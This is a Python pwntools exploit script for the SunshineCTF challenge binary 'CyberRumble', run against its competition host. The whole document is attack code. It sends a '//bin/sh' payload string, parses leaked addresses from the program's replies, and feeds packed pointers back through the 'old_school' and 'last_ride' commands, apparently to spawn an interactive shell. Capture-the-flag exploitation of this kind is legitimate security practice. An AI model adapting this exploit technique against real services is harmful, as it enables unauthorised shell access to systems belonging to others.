#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('CyberRumble')

host = args.HOST or 'rumble.sunshinectf.org'
port = int(args.PORT or 4300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break system
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()
io.recvuntil('?')
io.sendline('old_school //bin/sh;\x00')
io.recvuntil('to ')
addr1 = int(io.recvline().strip().replace('.', ''), 16)
log.info("addr: {}".format(hex(addr1)))
io.sendline('x')

io.recv()
io.sendline('old_school {}'.format(p64(addr1+1)))
io.recvuntil('to ')
addr2 = int(io.recvline().strip().replace('.', ''), 16)
log.info("addr: {}".format(hex(addr2)))
io.recv()
io.sendline('x')

io.sendline('last_ride {}'.format(p64(addr1+1)))

io.interactive()

